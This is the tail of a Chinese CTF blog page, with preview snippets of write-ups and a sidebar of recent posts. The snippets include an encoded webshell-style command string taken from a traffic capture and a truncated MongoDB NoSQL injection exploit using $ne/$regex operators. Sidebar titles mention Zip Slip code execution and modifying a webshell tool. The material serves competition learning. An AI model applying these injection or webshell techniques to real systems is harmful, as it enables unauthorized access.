还是少个二进制啊，可惜我们学校二进制断代了┭┮﹏┭┮ 比赛期间太仓促了，忘了截图，就这样纯文字吧签到密文：kaljviko8ohhh59;49:p单字符的xor，写个简单脚本计算： 12s = &quot;kaljviko8ohhh59;49:p&quot;print(&#x27;&#x27;.join(chr(ord(c)^13) for c in s)) flag{dfb5beee846947} misc1流量包内搜索 flag 的 base64 编码的前面部分 http contains &quot;Zmxh&quot; 找到一段流量包，跟踪 http 流，里面有这么一段： 1ZmxhZ3thNjVlMjdhZmMyYTdmN2UyN2ZmYjZkMjM5Mzk1ODU3Zn0iPmZsYWcudHh0O2VjaG8gY2E0OTg1ZjBmOGE5O3B3ZDtlY2hvIDJmOWUwNDJlM2Y2MQ%3D%3D 解 base64 得到 flag flag{a65e27afc2a7f7e27ffb6d239395857f} web1刚开始没看...</div></div></div></a><a class="pagination-related" href="/2025/08/24/NSSCTF-4th-wp/" title="NSSCTF 4th-wp"><img class="cover" src="/img/anon3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-24</div><div class="info-item-2">NSSCTF 4th-wp</div></div><div class="info-2"><div class="info-item-1">依旧是单军奋战这一块，而且下午睡到 5 点多才想起来还有这么个比赛，半个小时速通两道 WEB 题这一块 WEBez_signin这题就是典型的 MongoDB NoSQL 注入，突破口在源码里 POST &#x2F;search 接受 JSON 时，title&#x2F;author 如果是 dict 会被原样拼进查询，没有加 $eq 且不做净化，所以可以直接塞 $ne &#x2F; $regex 等操作符来“放大查询”拿到库里全部书、然后做一轮搜索搜出 flagexp： 123456789101112131415161718192021222324252627282930313233343536373839404142import requests, re, jsonbase = &quot;http://node8.anna.nssctf.cn:27612&quot;def dump_all():    # 取全量（有标题的都来）    r = requests.post(base + &quot;/search&quot;,                      hea...</div></div></div></a><a class="pagination-related" href="/2025/08/09/XYCTF2025-wp/" title="XYCTF2025-wp"><img class="cover" src="/img/anon.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-09</div><div class="info-item-2">XYCTF2025-wp</div></div><div class="info-2"><div class="info-item-1">比赛是之前打的，但是一直没有复盘，暑假闲来无事故决定复盘一下，也是作为复习 WEBfate12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/env python3import flaskimport sqlite3import requestsimport stringimport jsonapp = flask.Flask(__name__)blacklist = string.ascii_lettersdef binary_to_string(binary_string):    if len(binary_string) % 8 != 0:        raise ValueError(&quot;Binary string length must be a multiple of 8&quot...</div></div></div></a><a class="pagination-related" href="/2025/08/08/%E6%A0%A1%E8%B5%9B%E9%A2%98%E7%9B%AE%E6%8E%A8%E6%96%AD/" title="校赛题目推断"><img class="cover" src="/img/anon2.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-08</div><div class="info-item-2">校赛题目推断</div></div><div class="info-2"><div class="info-item-1">之前因为期末的原因没有去打，现在闲下来了突然想起来，但是现在已经不开放了，所以就进行一个通过题目名称猜测题目内容的活动，也是水一篇blog，顺便鉴定一下学长的成分（ 下面是题目列表 1234567891011121314151617181920212223MiscHTTPS怎么也不安全	张静媛学姐的秘密文件	段涵涵学姐最爱的音乐	流量分析-1	流量分析-2	流量分析-3	流量分析-4	流量分析-5	流量分析-6	流量分析-7	流量分析-8CryptoBase141	RSA你太baby了	愤怒的笑笑Webbusy_search	can_u_escape	ez?upload2	ez_upload	give!me!money!	lottery签到重生版	pop之我又双叒叕重生了	u_know?	函数重生版	小猿口算签到重生版Reversemaze	IDA	Xor	rere	sw1f7&#x27;s TEA	sw1f7&#x27;s XXTEAMobilease_androidOSINT杜浩学姐の朋友圈	杜浩学姐の旅行  MISC总体还是比较难猜，直接放弃 WEB还是这个稍稍好猜一点点，...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ALe</div><div class="author-info-description">从渗透测试到网安烧烤的一生</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ALe1293528"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">恐惧扼住咽喉，如枷锁禁锢我的双臂 我向沉默发问，沉默却愈发震耳欲聋</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">1.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-math"><span class="toc-number">1.1.</span> <span class="toc-text">ez_math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-math"><span class="toc-number">1.2.</span> <span class="toc-text">mid_math</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">签到</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bottle"><span class="toc-number">3.1.</span> <span class="toc-text">ez_bottle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ekko-note"><span class="toc-number">3.2.</span> <span class="toc-text">Ekko note</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="文件解压之过（Zip Slip）漏洞导致 Python 代码执行"><img src="/img/mygo6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件解压之过（Zip Slip）漏洞导致 Python 代码执行"/></a><div class="content"><a class="title" href="/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="文件解压之过（Zip Slip）漏洞导致 Python 代码执行">文件解压之过（Zip Slip）漏洞导致 Python 代码执行</a><time datetime="2025-11-30T03:58:13.000Z" title="Created 2025-11-30 11:58:13">2025-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改"><img src="/img/mygo5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BehinderV4魔改"/></a><div class="content"><a class="title" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改">BehinderV4魔改</a><time datetime="2025-10-30T12:38:13.000Z" title="Created 2025-10-30 20:38:13">2025-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/26/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B/" title="Python多线程"><img src="/img/mygo4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python多线程"/></a><div class="content"><a class="title" href="/2025/10/26/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B/" title="Python多线程">Python多线程</a><time datetime="2025-10-26T13:23:24.000Z" title="Created 2025-10-26 21:23:24">2025-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/17/Docker%E5%9F%BA%E7%A1%80/" title="Docker基础"><img src="/img/mygo3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker基础"/></a><div class="content"><a class="title" href="/2025/10/17/Docker%E5%9F%BA%E7%A1%80/" title="Docker基础">Docker基础</a><time datetime="2025-10-17T08:01:55.000Z" title="Created 2025-10-17 16:01:55">2025-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/2025%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-wp/" title="2025年江苏省第七届大学生网络安全知识技能大赛-wp"><img src="/img/mygo1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025年江苏省第七届大学生网络安全知识技能大赛-wp"/></a><div class="content"><a class="title" href="/2025/09/22/2025%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-wp/" title="2025年江苏省第七届大学生网络安全知识技能大赛-wp">2025年江苏省第七届大学生网络安全知识技能大赛-wp</a><time datetime="2025-09-22T10:38:33.000Z" title="Created 2025-09-22 18:38:33">2025-09-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By ALe</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>